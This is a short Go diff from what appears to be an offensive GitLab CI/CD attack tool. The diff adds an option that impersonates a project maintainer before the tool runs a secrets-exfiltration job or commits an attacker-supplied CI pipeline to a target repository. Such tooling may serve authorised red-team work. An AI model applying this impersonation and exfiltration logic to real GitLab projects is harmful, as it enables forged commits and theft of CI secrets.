@@ -144,6 +144,11 @@ func runAttackSecrets(ctx context.Context, cmd *cobra.Command, client *gitlabx.C
 		}
 	}
 	sr := newSecretsRunner(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
+	if atkImpersonateMaintainer {
+		if err := sr.ImpersonateMaintainer(ctx, atkTarget); err != nil {
+			return fmt.Errorf("impersonate maintainer: %w", err)
+		}
+	}
 	exfil := attack.ExfilOptions{Method: atkExfilMethod, Target: atkExfilTarget}
 	url, exfilJobNameUsed, err := sr.RunExfil(ctx, atkTarget, atkBranch, string(pubkeyBytes), tags, exfil)
 	if err != nil {
@@ -253,6 +258,9 @@ func commitCIAndTrackPipeline(ctx context.Context, client *gitlabx.Client, ci st
 		return "", "", 0, err
 	}
 	att := newAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
+	if err := applyAttackImpersonation(ctx, att, atkTarget); err != nil {
+		return "", "", 0, err
+	}
 	url, err = att.CommitCIPipeline(ctx, atkTarget, finalBranch, ci, atkMessage)
 	if err != nil {
 		return "", "", 0, err
